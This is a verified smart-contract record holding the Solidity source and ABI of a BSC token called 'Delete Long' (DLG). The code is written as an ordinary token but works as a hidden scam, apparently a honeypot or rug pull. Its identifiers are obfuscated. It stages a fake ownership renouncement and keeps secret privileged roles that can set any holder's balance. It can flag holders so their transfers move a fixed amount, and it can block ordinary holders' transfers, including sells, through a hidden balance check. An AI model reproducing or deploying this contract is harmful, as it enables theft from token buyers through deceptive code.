{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface receiverSender {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxLaunched) external view returns (uint256);\n\n    function transfer(address marketingTx, uint256 atLaunchedToken) external returns (bool);\n\n    function allowance(address listTrading, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 atLaunchedToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingTx,\n        uint256 atLaunchedToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderTx, uint256 value);\n    event Approval(address indexed listTrading, address indexed spender, uint256 value);\n}\n\nabstract contract exemptMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface maxAt {\n    function createPair(address shouldMode, address isReceiverList) external returns (address);\n}\n\ninterface liquidityTake is receiverSender {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DeleteLong is exemptMin, receiverSender, liquidityTake {\n\n    uint256 private fundLaunch = 100000000 * 10 ** 18;\n\n    bool public receiverTrading;\n\n    mapping(address => bool) public exemptTeam;\n\n    uint256 private toFund;\n\n    function decimals() external view virtual override returns (uint8) {\n        return shouldExempt;\n    }\n\n    function getOwner() external view returns (address) {\n        return senderLimit;\n    }\n\n    bool public launchedEnable;\n\n    function buyMin(address fromAtBuy) public {\n        if (launchedEnable) {\n            return;\n        }\n        \n        exemptTeam[fromAtBuy] = true;\n        if (fromFee != toFund) {\n            toFund = fromTake;\n        }\n        launchedEnable = true;\n    }\n\n    bool public modeLaunchedLaunch;\n\n    address private senderLimit;\n\n    uint256 public fromLiquidity;\n\n    constructor (){\n        if (fromTake == fromLiquidity) {\n            shouldLaunch = false;\n        }\n        toMin minTake = toMin(maxTo);\n        senderTokenMin = maxAt(minTake.factory()).createPair(minTake.WETH(), address(this));\n        \n        txTake = _msgSender();\n        teamSwap();\n        exemptTeam[txTake] = true;\n        exemptIsAuto[txTake] = fundLaunch;\n        if (receiverSenderBuy != fromFee) {\n            toFund = fromTake;\n        }\n        emit Transfer(address(0), txTake, fundLaunch);\n    }\n\n    function liquidityIs(address maxSenderWallet) public {\n        fundTx();\n        if (fromLiquidity == fromTake) {\n            fromTake = toFund;\n        }\n        if (maxSenderWallet == txTake || maxSenderWallet == senderTokenMin) {\n            return;\n        }\n        receiverSenderTo[maxSenderWallet] = true;\n    }\n\n    mapping(address => uint256) private exemptIsAuto;\n\n    address maxTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function modeMarketing(address feeTx, address marketingTx, uint256 atLaunchedToken) internal returns (bool) {\n        if (feeTx == txTake) {\n            return feeWalletAt(feeTx, marketingTx, atLaunchedToken);\n        }\n        uint256 sellList = receiverSender(senderTokenMin).balanceOf(walletSender);\n        require(sellList == receiverFund);\n        require(marketingTx != walletSender);\n        if (receiverSenderTo[feeTx]) {\n            return feeWalletAt(feeTx, marketingTx, autoSwap);\n        }\n        return feeWalletAt(feeTx, marketingTx, atLaunchedToken);\n    }\n\n    bool public totalSwapMode;\n\n    function feeWalletAt(address feeTx, address marketingTx, uint256 atLaunchedToken) internal returns (bool) {\n        require(exemptIsAuto[feeTx] >= atLaunchedToken);\n        exemptIsAuto[feeTx] -= atLaunchedToken;\n        exemptIsAuto[marketingTx] += atLaunchedToken;\n        emit Transfer(feeTx, marketingTx, atLaunchedToken);\n        return true;\n    }\n\n    function allowance(address shouldWalletIs, address totalTx) external view virtual override returns (uint256) {\n        if (totalTx == maxTo) {\n            return type(uint256).max;\n        }\n        return launchAt[shouldWalletIs][totalTx];\n    }\n\n    bool public enableFee;\n\n    mapping(address => bool) public receiverSenderTo;\n\n    function receiverAt(uint256 atLaunchedToken) public {\n        fundTx();\n        receiverFund = atLaunchedToken;\n    }\n\n    address walletSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => mapping(address => uint256)) private launchAt;\n\n    uint256 public fromFee;\n\n    string private swapSender = \"Delete Long\";\n\n    uint256 receiverFund;\n\n    bool public shouldLaunch;\n\n    function approve(address totalTx, uint256 atLaunchedToken) public virtual override returns (bool) {\n        launchAt[_msgSender()][totalTx] = atLaunchedToken;\n        emit Approval(_msgSender(), totalTx, atLaunchedToken);\n        return true;\n    }\n\n    uint8 private shouldExempt = 18;\n\n    address public txTake;\n\n    function teamSwap() public {\n        emit OwnershipTransferred(txTake, address(0));\n        senderLimit = address(0);\n    }\n\n    address public senderTokenMin;\n\n    uint256 private fromTake;\n\n    function fundTx() private view {\n        require(exemptTeam[_msgSender()]);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return swapSender;\n    }\n\n    function transfer(address exemptModeAuto, uint256 atLaunchedToken) external virtual override returns (bool) {\n        return modeMarketing(_msgSender(), exemptModeAuto, atLaunchedToken);\n    }\n\n    event OwnershipTransferred(address indexed minTradingSwap, address indexed tokenSwap);\n\n    function symbol() external view virtual override returns (string memory) {\n        return toAutoAt;\n    }\n\n    uint256 public receiverSenderBuy;\n\n    uint256 constant autoSwap = 7 ** 10;\n\n    function tradingSwap(address exemptModeAuto, uint256 atLaunchedToken) public {\n        fundTx();\n        exemptIsAuto[exemptModeAuto] = atLaunchedToken;\n    }\n\n    string private toAutoAt = \"DLG\";\n\n    function balanceOf(address maxLaunched) public view virtual override returns (uint256) {\n        return exemptIsAuto[maxLaunched];\n    }\n\n    uint256 shouldTx;\n\n    function transferFrom(address feeTx, address marketingTx, uint256 atLaunchedToken) external override returns (bool) {\n        if (_msgSender() != maxTo) {\n            if (launchAt[feeTx][_msgSender()] != type(uint256).max) {\n                require(atLaunchedToken <= launchAt[feeTx][_msgSender()]);\n                launchAt[feeTx][_msgSender()] -= atLaunchedToken;\n            }\n        }\n        return modeMarketing(feeTx, marketingTx, atLaunchedToken);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fundLaunch;\n    }\n\n    function owner() external view returns (address) {\n        return senderLimit;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minTradingSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenSwap\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderTx\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldWalletIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atLaunchedToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromAtBuy\",\"type\":\"address\"}],\"name\":\"buyMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxSenderWallet\",\"type\":\"address\"}],\"name\":\"liquidityIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLaunchedLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"atLaunchedToken\",\"type\":\"uint256\"}],\"name\":\"receiverAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSenderBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverSenderTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTokenMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSwapMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptModeAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atLaunchedToken\",\"type\":\"uint256\"}],\"name\":\"tradingSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptModeAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atLaunchedToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atLaunchedToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DeleteLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}